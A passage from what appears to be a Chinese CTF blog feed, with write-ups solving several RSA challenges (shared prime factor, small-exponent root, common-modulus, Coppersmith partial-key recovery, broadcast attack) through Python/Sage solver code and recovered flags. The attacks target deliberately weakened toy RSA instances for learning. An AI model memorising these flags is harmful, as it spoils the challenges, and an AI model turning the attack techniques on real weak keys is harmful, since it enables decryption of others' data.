class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>],</span><br><span class="line">    [<span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>]</span><br><span class="line">]</span><br><span class="line">cipher_list = base64.b64encode(DES.encrypt(mes))</span><br><span class="line"><span class="built_in">print</span> cipher_list <span class="comment"># &quot;gAN5RT1XWKI0OyUayZj35SlKQ+if2PAJ&quot;</span></span><br><span class="line"><span class="comment">#flag = mes + deskey</span></span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>Crypto</category>
      </categories>
      <tags>
        <tag>Crypto</tag>
      </tags>
  </entry>
  <entry>
    <title>密码学大佬Blog记录</title>
    <url>/posts/aee69506/</url>
    <content><![CDATA[<p>后续多看下大佬博客 学习一下 慢慢补基础</p>
<p><a href="https://lazzzaro.github.io/">https://lazzzaro.github.io/</a></p>
<p><a href="https://jayxv.github.io/">https://jayxv.github.io/</a></p>
<p><a href="https://www.ruanx.net/author/blue/">https://www.ruanx.net/author/blue/</a></p>
]]></content>
      <categories>
        <category>Crypto</category>
      </categories>
      <tags>
        <tag>Crypto</tag>
      </tags>
  </entry>
  <entry>
    <title>NSSCTF Crypto 02</title>
    <url>/posts/22530663/</url>
    <content><![CDATA[<h2 id="HGAME-2022-week2-RSA-Attack2"><a href="#HGAME-2022-week2-RSA-Attack2" class="headerlink" title="[HGAME 2022 week2]RSA Attack2"></a>[HGAME 2022 week2]RSA Attack2</h2><h3 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h3><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">from</span> math <span class="keyword">import</span> ceil</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> getPrime</span><br><span class="line"><span class="keyword">from</span> libnum <span class="keyword">import</span> s2n</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line"></span><br><span class="line">flag_parts = <span class="built_in">list</span>(<span class="built_in">map</span>(s2n, re.findall(<span class="string">rf&quot;.&#123;&#123;,<span class="subst">&#123;ceil(<span class="built_in">len</span>(flag) / <span class="number">3</span>)&#125;</span>&#125;&#125;&quot;</span>, flag)))</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;# task1&quot;</span>)</span><br><span class="line">m = flag_parts[<span class="number">0</span>]</span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">p = getPrime(<span class="number">1024</span>)</span><br><span class="line">q = getPrime(<span class="number">1024</span>)</span><br><span class="line">r = getPrime(<span class="number">1024</span>)</span><br><span class="line">n1 = p * q</span><br><span class="line">c1 = <span class="built_in">pow</span>(m, e, n1)</span><br><span class="line">n2 = r * q</span><br><span class="line">c2 = <span class="built_in">pow</span>(m, e, n2)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;e =&quot;</span>, e)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;n1 =&quot;</span>, n1)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;c1 =&quot;</span>, c1)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;n2 =&quot;</span>, n2)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;c2 =&quot;</span>, c2)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;# task2&quot;</span>)</span><br><span class="line">m = flag_parts[<span class="number">1</span>]</span><br><span class="line">e = <span class="number">7</span></span><br><span class="line">p = getPrime(<span class="number">1024</span>)</span><br><span class="line">q = getPrime(<span class="number">1024</span>)</span><br><span class="line">n = p * q</span><br><span class="line">c = <span class="built_in">pow</span>(m, e, n)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;e =&quot;</span>, e)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;n =&quot;</span>, n)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;c =&quot;</span>, c)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;# task3&quot;</span>)</span><br><span class="line">m = flag_parts[<span class="number">2</span>]</span><br><span class="line">p = getPrime(<span class="number">1024</span>)</span><br><span class="line">q = getPrime(<span class="number">1024</span>)</span><br><span class="line">n = p * q</span><br><span class="line">e1 = getPrime(<span class="number">32</span>)</span><br><span class="line">e2 = getPrime(<span class="number">32</span>)</span><br><span class="line">c1 = <span class="built_in">pow</span>(m, e1, n)</span><br><span class="line">c2 = <span class="built_in">pow</span>(m, e2, n)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;n =&quot;</span>, n)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;e1 =&quot;</span>, e1)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;c1 =&quot;</span>, c1)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;e2 =&quot;</span>, e2)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;c2 =&quot;</span>, c2)</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h3 id="WP"><a href="#WP" class="headerlink" title="WP"></a>WP</h3><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="comment"># task1 共享素数</span></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">n1 = <span class="number">14611545605107950827581005165327694782823188603151768169731431418361306231114985037775917461433925308054396970809690804073985835376464629860609710292181368600618626590498491850404503443414241455487304448344892337877422465715709154238653505141605904184985311873763495761345722155289457889686019746663293720106874227323699288277794292208957172446523420596391114891559537811029473150123641624108103676516754449492805126642552751278309634846777636042114135990516245907517377320190091400729277307636724890592155256437996566160995456743018225013851937593886086129131351582958811003596445806061492952513851932238563627194553</span></span><br><span class="line">c1 = <span class="number">965075803554932988664271816439183802328812013694203741320763105376036912584995031647672348468111310423680858101990670067065306237596121664884353679987689532305437801346923070145524106271337770666947677115752724993307387122132705797012726237073550669419110046308257408484535063515678066777681017211510981429273346928022971149411064556225001287399141306136081722471075032423079692908380267160214143720516748000734987068685104675254411687005690312116824966036851568223828884335112144637268090397158532937141122654075952730052331573980701136378212002956719295192733955673315234274064519957670199895100508623561838510479</span></span><br><span class="line">n2 = <span class="number">20937478725109983803079185450449616567464596961348727453817249035110047585580142823551289577145958127121586792878509386085178452171112455890429474457797219202827030884262273061334752493496797935346631509806685589179618367453992749753318273834113016237120686880514110415113673431170488958730203963489455418967544128619234394915820392908422974075932751838012185542968842691824203206517795693893863945100661940988455695923511777306566419373394091907349431686646485516325575494902682337518438042711296437513221448397034813099279203955535025939120139680604495486980765910892438284945450733375156933863150808369796830892363</span></span><br><span class="line">c2 = <span class="number">11536506945313747180442473461658912307154460869003392732178457643224057969838224601059836860883718459986003106970375778443725748607085620938787714081321315817144414115589952237492448483438910378865359239575169326116668030463275817609827626048962304593324479546453471881099976644410889657248346038986836461779780183411686260756776711720577053319504691373550107525296560936467435283812493396486678178020292433365898032597027338876045182743492831814175673834198345337514065596396477709839868387265840430322983945906464646824470437783271607499089791869398590557314713094674208261761299894705772513440948139429011425948090</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># n1 n2 存在公共因子q</span></span><br><span class="line">q = gmpy2.gcd(n1,n2)</span><br><span class="line"><span class="built_in">print</span>(q)</span><br><span class="line"><span class="comment"># n1 = p * q</span></span><br><span class="line"><span class="comment"># n2 = r * q</span></span><br><span class="line">p = n1 // q</span><br><span class="line">r = n2 // q</span><br><span class="line"><span class="built_in">print</span>(p)</span><br><span class="line"><span class="built_in">print</span>(r)</span><br><span class="line"></span><br><span class="line">d1 = gmpy2.invert(e,(p-<span class="number">1</span>)*(q-<span class="number">1</span>))</span><br><span class="line">d2 = gmpy2.invert(e,(r-<span class="number">1</span>)*(q-<span class="number">1</span>))</span><br><span class="line">m1 = <span class="built_in">pow</span>(c1,d1,n1)</span><br><span class="line">m2 = <span class="built_in">pow</span>(c2,d2,n2)</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(m1))</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(m2))</span><br><span class="line"><span class="comment"># b&#x27;hgame&#123;RsA@hAS!a&amp;VArIETY?of.&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># task2  低指数e  小明文攻击  直接开根</span></span><br><span class="line">e2 = <span class="number">7</span></span><br><span class="line">n = <span class="number">14157878492255346300993349653813018105991884577529909522555551468374307942096214964604172734381913051273745228293930832314483466922529240958994897697475939867025561348042725919663546949015024693952641936481841552751484604123097148071800416608762258562797116583678332832015617217745966495992049762530373531163821979627361200921544223578170718741348242012164115593777700903954409103110092921578821048933346893212805071682235575813724113978341592885957767377587492202740185970828629767501662195356276862585025913615910839679860669917255271734413865211340126544199760628445054131661484184876679626946360753009512634349537</span></span><br><span class="line">c = <span class="number">10262871020519116406312674685238364023536657841034751572844570983750295909492149101500869806418603732181350082576447594766587572350246675445508931577670158295558641219582729345581697448231116318080456112516700717984731655900726388185866905989088504004805024490513718243036445638662260558477697146032055765285263446084259814560197549018044099935158351931885157616527235283229066145390964094929007056946332051364474528453970904251050605631514869007890625</span></span><br><span class="line"></span><br><span class="line">m2 = gmpy2.iroot(c,e2)[<span class="number">0</span>]</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(m2))</span><br><span class="line"></span><br><span class="line"><span class="comment"># task3  共模攻击</span></span><br><span class="line">n = <span class="number">18819509188106230363444813350468162056164434642729404632983082518225388069544777374544142317612858448345344137372222988033366528086236635213756227816610865045924357232188768913642158448603346330462535696121739622702200540344105464126695432011739181531217582949804939555720700457350512898322376591813135311921904580338340203569582681889243452495363849558955947124975293736509426400460083981078846138740050634906824438689712748324336878791622676974341814691041262280604277357889892211717124319329666052810029131172229930723477981468761369516771720250571713027972064974999802168017946274736383148001865929719248159075729</span></span><br><span class="line">e31 = <span class="number">2519901323</span></span><br><span class="line">c31 = <span class="number">3230779726225544872531441169009307072073754578761888387983403206364548451496736513905460381907928107310030086346589351105809028599650303539607581407627819797944337398601400510560992462455048451326593993595089800150342999021874734748066692962362650540036002073748766509347649818139304363914083879918929873577706323599628031618641793074018304521243460487551364823299685052518852685706687800209505277426869140051056996242882132616256695188870782634310362973153766698286258946896866396670872451803114280846709572779780558482223393759475999103607704510618332253710503857561025613632592682931552228150171423846203875344870</span></span><br><span class="line">e32 = <span class="number">3676335737</span></span><br><span class="line">c32 = <span class="number">940818595622279161439836719641707846790294650888799822335007385854166736459283129434769062995122371073636785371800857633841379139761091890426137981113087519934854663776695944489430385663011713917022574342380155718317794204988626116362865144125136624722782309455452257758808172415884403909840651554485364309237853885251876941477098008690389600544398998669635962495989736021020715396415375890720335697504837045188626103142204474942751410819466379437091569610294575687793060945525108986660851277475079994466474859114092643797418927645726430175928247476884879817034346652560116597965191204061051401916282814886688467861</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rsa_gong_N_def</span>(<span class="params">e1,e2,c1,c2,n</span>): <span class="comment">#共模攻击函数</span></span><br><span class="line">    e1, e2, c1, c2, n=<span class="built_in">int</span>(e1),<span class="built_in">int</span>(e2),<span class="built_in">int</span>(c1),<span class="built_in">int</span>(c2),<span class="built_in">int</span>(n)</span><br><span class="line">    s = gmpy2.gcdext(e1, e2)</span><br><span class="line">    s1 = s[<span class="number">1</span>]</span><br><span class="line">    s2 = s[<span class="number">2</span>]</span><br><span class="line">    <span class="keyword">if</span> s1 &lt; <span class="number">0</span>:</span><br><span class="line">        s1 = - s1</span><br><span class="line">        c1 = gmpy2.invert(c1, n)</span><br><span class="line">    <span class="keyword">elif</span> s2 &lt; <span class="number">0</span>:</span><br><span class="line">        s2 = - s2</span><br><span class="line">        c2 = gmpy2.invert(c2, n)</span><br><span class="line">    m = (<span class="built_in">pow</span>(c1,s1,n) * <span class="built_in">pow</span>(c2 ,s2 ,n)) % n</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">int</span>(m)</span><br><span class="line"></span><br><span class="line">m3 = rsa_gong_N_def(e31,e32,c31,c32,n)</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(m3))</span><br><span class="line"></span><br><span class="line">flag = long_to_bytes(m1)+long_to_bytes(m2)+long_to_bytes(m3)</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"><span class="comment"># b&#x27;hgame&#123;RsA@hAS!a&amp;VArIETY?of.AttacK^mEThodS^whAT:other!AttACK|METHOdS~do@you_KNOW&#125;&#x27;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>





<h1 id="鹤城杯-2021-BabyRSA"><a href="#鹤城杯-2021-BabyRSA" class="headerlink" title="[鹤城杯 2021]BabyRSA"></a>[鹤城杯 2021]BabyRSA</h1><h3 id="题目-1"><a href="#题目-1" class="headerlink" title="题目"></a>题目</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> getPrime, bytes_to_long</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line"> </span><br><span class="line">p = getPrime(<span class="number">1024</span>)</span><br><span class="line">q = getPrime(<span class="number">1024</span>)</span><br><span class="line">n = p * q</span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">hint1 = p &gt;&gt; <span class="number">724</span></span><br><span class="line">hint2 = q % (<span class="number">2</span> ** <span class="number">265</span>)</span><br><span class="line">ct = <span class="built_in">pow</span>(bytes_to_long(flag), e, n)</span><br><span class="line"><span class="built_in">print</span>(hint1)</span><br><span class="line"><span class="built_in">print</span>(hint2)</span><br><span class="line"><span class="built_in">print</span>(n)</span><br><span class="line"><span class="built_in">print</span>(ct)</span><br><span class="line"> </span><br><span class="line"><span class="number">1514296530850131082973956029074258536069144071110652176122006763622293335057110441067910479</span></span><br><span class="line"><span class="number">40812438243894343296354573724131194431453023461572200856406939246297219541329623</span></span><br><span class="line"><span class="number">21815431662065695412834116602474344081782093119269423403335882867255834302242945742413692949886248581138784199165404321893594820375775454774521554409598568793217997859258282700084148322905405227238617443766062207618899209593375881728671746850745598576485323702483634599597393910908142659231071532803602701147251570567032402848145462183405098097523810358199597631612616833723150146418889589492395974359466777040500971885443881359700735149623177757865032984744576285054725506299888069904106805731600019058631951255795316571242969336763938805465676269140733371287244624066632153110685509892188900004952700111937292221969</span></span><br><span class="line"><span class="number">19073695285772829730103928222962723784199491145730661021332365516942301513989932980896145664842527253998170902799883262567366661277268801440634319694884564820420852947935710798269700777126717746701065483129644585829522353341718916661536894041337878440111845645200627940640539279744348235772441988748977191513786620459922039153862250137904894008551515928486867493608757307981955335488977402307933930592035163126858060189156114410872337004784951228340994743202032248681976932591575016798640429231399974090325134545852080425047146251781339862753527319093938929691759486362536986249207187765947926921267520150073408188188</span></span><br></pre></td></tr></table></figure>

<h3 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h3><p>已知e n c，</p>
<p>hint1 p的高300位</p>
<p>hint2 q的低265位</p>
<p>如果想用高位攻击 那么1024位至少需要已知一半以上才行【网上说要570位】 300+265=565位 还差5位</p>
<p>目前已知 300+265位【565位】 还剩中间未知459位 需要通过coppersmith求解</p>
<p>正常情况下需要知道 570位</p>
<p># q0 = q % 2**265</p>
<p># q = q0 + k*2**265</p>
<p># n = p<em>q = p</em>q0 + pk * 2**265</p>
<p># 两边同除p</p>
<p># n * p**(-1) = q0 + pk * 2**265 * p**(-1)</p>
<p># q0 = n * p**(-1) - pk* 2**265 * p**(-1)</p>
<p># q0 = n * p**(-1) - pk*p**(-1) % 2**265</p>
<p># p q换下位置</p>
<p># p0 = n * q**(-1) - qk*q**(-1) % 2**265</p>
<p># p0 = (n * q**(-1) ) % 2**265</p>
<h3 id="WP-1"><a href="#WP-1" class="headerlink" title="WP"></a>WP</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"> </span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line"><span class="comment"># hint1 = p &gt;&gt; 724  p高300[1024-724]位</span></span><br><span class="line">hint1 = <span class="number">1514296530850131082973956029074258536069144071110652176122006763622293335057110441067910479</span></span><br><span class="line">ph = hint1 &lt;&lt; <span class="number">724</span></span><br><span class="line"><span class="comment"># hint2 = q % (2 ** 265)  q 低265位</span></span><br><span class="line">q0 = <span class="number">40812438243894343296354573724131194431453023461572200856406939246297219541329623</span></span><br><span class="line">n = <span class="number">21815431662065695412834116602474344081782093119269423403335882867255834302242945742413692949886248581138784199165404321893594820375775454774521554409598568793217997859258282700084148322905405227238617443766062207618899209593375881728671746850745598576485323702483634599597393910908142659231071532803602701147251570567032402848145462183405098097523810358199597631612616833723150146418889589492395974359466777040500971885443881359700735149623177757865032984744576285054725506299888069904106805731600019058631951255795316571242969336763938805465676269140733371287244624066632153110685509892188900004952700111937292221969</span></span><br><span class="line">c = <span class="number">19073695285772829730103928222962723784199491145730661021332365516942301513989932980896145664842527253998170902799883262567366661277268801440634319694884564820420852947935710798269700777126717746701065483129644585829522353341718916661536894041337878440111845645200627940640539279744348235772441988748977191513786620459922039153862250137904894008551515928486867493608757307981955335488977402307933930592035163126858060189156114410872337004784951228340994743202032248681976932591575016798640429231399974090325134545852080425047146251781339862753527319093938929691759486362536986249207187765947926921267520150073408188188</span></span><br><span class="line"> </span><br><span class="line">mod = <span class="built_in">pow</span>(<span class="number">2</span>,<span class="number">265</span>)</span><br><span class="line"><span class="comment"># 根据q低位 求p低265位</span></span><br><span class="line"><span class="comment"># pl = (n * q**(-1) ) % 2**265</span></span><br><span class="line">pl = n*gmpy2.invert(q0,mod) % mod</span><br><span class="line"><span class="comment"># print(pl)</span></span><br><span class="line">pbar = ph+pl</span><br><span class="line"><span class="comment"># print(pbar)</span></span><br><span class="line"> </span><br><span class="line"><span class="comment">#SAGE#####</span></span><br><span class="line">PR.&lt;x&gt; = PolynomialRing(Zmod(n))</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>^<span class="number">5</span>):</span><br><span class="line">    f = pbar + x*mod*<span class="number">2</span>^<span class="number">5</span></span><br><span class="line">    f = f.monic()</span><br><span class="line">    roots = f.small_roots(X=<span class="number">2</span>^<span class="number">454</span>,beta=<span class="number">0.4</span>)</span><br><span class="line">    <span class="keyword">if</span>(roots):</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    pbar += mod</span><br><span class="line">     </span><br><span class="line">p = pbar + roots[<span class="number">0</span>]*mod*<span class="number">2</span>^<span class="number">5</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">assert</span> n%p ==<span class="number">0</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;p =&quot;</span>,p)</span><br><span class="line"><span class="comment">##########</span></span><br><span class="line">p = <span class="number">133637329398256221348922087205912367118213472434713498908220867690672019569057789598459580146410501473689139466275052698529257254973211963162087316149628000798221014338373126500646873612341158676084318494058522014519669302359038980726479317742766438142835169562422371156257894374341629012755597863752154328407</span></span><br><span class="line">q = n//p</span><br><span class="line"><span class="built_in">print</span>(q)</span><br><span class="line">phi = (q-<span class="number">1</span>)*(p-<span class="number">1</span>)</span><br><span class="line">d = gmpy2.invert(e,phi)</span><br><span class="line">m = <span class="built_in">pow</span>(c,d,n)</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(m))</span><br><span class="line"><span class="comment"># b&#x27;flag&#123;ef5e1582-8116-4f61-b458-f793dc03f2ff&#125;&#x27;</span></span><br></pre></td></tr></table></figure>



<h1 id="鹤城杯-2021-Crazy-Rsa-Tech"><a href="#鹤城杯-2021-Crazy-Rsa-Tech" class="headerlink" title="[鹤城杯 2021]Crazy_Rsa_Tech"></a>[鹤城杯 2021]Crazy_Rsa_Tech</h1><h3 id="题目-2"><a href="#题目-2" class="headerlink" title="题目"></a>题目</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.Padding <span class="keyword">import</span> *</span><br><span class="line"> </span><br><span class="line">FLAG = bytes_to_long(pad(<span class="string">b&quot;flag&#123;??????&#125;&quot;</span>,<span class="number">64</span>))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">init_key</span>():</span><br><span class="line">    p, q = getPrime(<span class="number">512</span>), getPrime(<span class="number">512</span>)</span><br><span class="line">    n = p*q</span><br><span class="line">    e = <span class="number">9</span></span><br><span class="line">    <span class="keyword">while</span>(GCD((p-<span class="number">1</span>)*(q-<span class="number">1</span>),e)!=<span class="number">1</span>):</span><br><span class="line">        p, q = getPrime(<span class="number">512</span>), getPrime(<span class="number">512</span>)</span><br><span class="line">        n = p*q</span><br><span class="line">    d = inverse(e,(p-<span class="number">1</span>)*(q-<span class="number">1</span>))</span><br><span class="line">    <span class="keyword">return</span> n,e,d</span><br><span class="line"> </span><br><span class="line">n_list=<span class="built_in">list</span>()</span><br><span class="line">c_list=<span class="built_in">list</span>()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">9</span>):</span><br><span class="line">    N,e,d=init_key()</span><br><span class="line">    n_list.append(N)</span><br><span class="line">    c=<span class="built_in">pow</span>(FLAG,e,N)</span><br><span class="line">    c_list.append(<span class="built_in">pow</span>(FLAG,e,N))</span><br><span class="line">    <span class="keyword">assert</span>(<span class="built_in">pow</span>(c,d,N)==FLAG)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;n_list:&quot;</span>,n_list)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;c_list:&quot;</span>,c_list)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="题目分析-1"><a href="#题目分析-1" class="headerlink" title="题目分析"></a>题目分析</h3><blockquote>
<p>如果选取的加密指数较低，并使用同一个加密指数e 加密密文，可通过广播攻击得到明文</p>
</blockquote>
<p>中国剩余定理</p>
<p>随机生成9组 n d 公用同一个e 输出密文c 求m</p>
<p>e值较低 可考虑低加密指数广播攻击【如果e值较低 且使用同一个e 进行密文加密 可通过广播攻击得到明文】</p>
<p><img src="/posts/22530663/2.png"></p>
<p>所以这题 对m开9次根可得到 flag</p>
<h3 id="WP-2"><a href="#WP-2" class="headerlink" title="WP"></a>WP</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">n_list = [<span class="number">71189786319102608575263218254922479901008514616376166401353025325668690465852130559783959409002115897148828732231478529655075366072137059589917001875303598680931962384468363842379833044123189276199264340224973914079447846845897807085694711541719515881377391200011269924562049643835131619086349617062034608799</span>, <span class="number">92503831027754984321994282254005318198418454777812045042619263533423066848097985191386666241913483806726751133691867010696758828674382946375162423033994046273252417389169779506788545647848951018539441971140081528915876529645525880324658212147388232683347292192795975558548712504744297104487514691170935149949</span>, <span class="number">100993952830138414466948640139083231443558390127247779484027818354177479632421980458019929149817002579508423291678953554090956334137167905685261724759487245658147039684536216616744746196651390112540237050493468689520465897258378216693418610879245129435268327315158194612110422630337395790254881602124839071919</span>, <span class="number">59138293747457431012165762343997972673625934330232909935732464725128776212729547237438509546925172847581735769773563840639187946741161318153031173864953372796950422229629824699580131369991913883136821374596762214064774480548532035315344368010507644630655604478651898097886873485265848973185431559958627423847</span>, <span class="number">66827868958054485359731420968595906328820823695638132426084478524423658597714990545142120448668257273436546456116147999073797943388584861050133103137697812149742551913704341990467090049650721713913812069904136198912314243175309387952328961054617877059134151915723594900209641163321839502908705301293546584147</span>, <span class="number">120940513339890268554625391482989102665030083707530690312336379356969219966820079510946652021721814016286307318930536030308296265425674637215009052078834615196224917417698019787514831973471113022781129000531459800329018133248426080717653298100515701379374786486337920294380753805825328119757649844054966712377</span>, <span class="number">72186594495190221129349814154999705524005203343018940547856004977368023856950836974465616291478257156860734574686154136925776069045232149725101769594505766718123155028300703627531567850035682448632166309129911061492630709698934310123778699316856399909549674138453085885820110724923723830686564968967391721281</span>, <span class="number">69105037583161467265649176715175579387938714721653281201847973223975467813529036844308693237404592381480367515044829190066606146105800243199497182114398931410844901178842049915914390117503986044951461783780327749665912369177733246873697481544777183820939967036346862056795919812693669387731294595126647751951</span>, <span class="number">76194219445824867986050004226602973283400885106636660263597964027139613163638212828932901192009131346530898961165310615466747046710743013409318156266326090650584190382130795884514074647833949281109675170830565650006906028402714868781834693473191228256626654011772428115359653448111208831188721505467497494581</span>]</span><br><span class="line">c_list = [<span class="number">62580922178008480377006528793506649089253164524883696044759651305970802215270721223149734532870729533611357047595181907404222690394917605617029675103788705320032707977225447998111744887898039756375876685711148857676502670812333076878964148863713993853526715855758799502735753454247721711366497722251078739585</span>, <span class="number">46186240819076690248235492196228128599822002268014359444368898414937734806009161030424589993541799877081745454934484263188270879142125136786221625234555265815513136730416539407710862948861531339065039071959576035606192732936477944770308784472646015244527805057990939765708793705044236665364664490419874206900</span>, <span class="number">85756449024868529058704599481168414715291172247059370174556127800630896693021701121075838517372920466708826412897794900729896389468152213884232173410022054605870785910461728567377769960823103334874807744107855490558726013068890632637193410610478514663078901021307258078678427928255699031215654693270240640198</span>, <span class="number">14388767329946097216670270960679686032536707277732968784379505904021622612991917314721678940833050736745004078559116326396233622519356703639737886289595860359630019239654690312132039876082685046329079266785042428947147658321799501605837784127004536996628492065409017175037161261039765340032473048737319069656</span>, <span class="number">1143736792108232890306863524988028098730927600066491485326214420279375304665896453544100447027809433141790331191324806205845009336228331138326163746853197990596700523328423791764843694671580875538251166864957646807184041817863314204516355683663859246677105132100377322669627893863885482167305919925159944839</span>, <span class="number">2978800921927631161807562509445310353414810029862911925227583943849942080514132963605492727604495513988707849133045851539412276254555228149742924149242124724864770049898278052042163392380895275970574317984638058768854065506927848951716677514095183559625442889028813635385408810698294574175092159389388091981</span>, <span class="number">16200944263352278316040095503540249310705602580329203494665614035841657418101517016718103326928336623132935178377208651067093136976383774189554806135146237406248538919915426183225265103769259990252162411307338473817114996409705345401251435268136647166395894099897737607312110866874944619080871831772376466376</span>, <span class="number">31551601425575677138046998360378916515711528548963089502535903329268089950335615563205720969393649713416910860593823506545030969355111753902391336139384464585775439245735448030993755229554555004154084649002801255396359097917380427525820249562148313977941413268787799534165652742114031759562268691233834820996</span>, <span class="number">25288164985739570635307839193110091356864302148147148153228604718807817833935053919412276187989509493755136905193728864674684139319708358686431424793278248263545370628718355096523088238513079652226028236137381367215156975121794485995030822902933639803569133458328681148758392333073624280222354763268512333515</span>]</span><br><span class="line"> </span><br><span class="line"><span class="comment"># print(len(n_list))</span></span><br><span class="line"><span class="comment"># print(len(c_list))</span></span><br><span class="line"><span class="comment"># 9</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">import</span>  gmpy2</span><br><span class="line"><span class="keyword">from</span>  Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> functools <span class="keyword">import</span> reduce</span><br><span class="line"><span class="keyword">import</span> sympy</span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">chinese_remainder</span>(<span class="params">n, a</span>):</span><br><span class="line">    <span class="built_in">sum</span> = <span class="number">0</span></span><br><span class="line">    prod = reduce(<span class="keyword">lambda</span> a, b: a * b, n)</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">for</span> n_i, a_i <span class="keyword">in</span> <span class="built_in">zip</span>(n, a):</span><br><span class="line">        p = prod // n_i</span><br><span class="line">        <span class="built_in">sum</span> += a_i * sympy.invert(p, n_i) * p</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">int</span>(<span class="built_in">sum</span> % prod)</span><br><span class="line"> </span><br><span class="line">m_e = chinese_remainder(n_list,c_list)</span><br><span class="line">e = <span class="number">9</span></span><br><span class="line"> </span><br><span class="line">m , f = 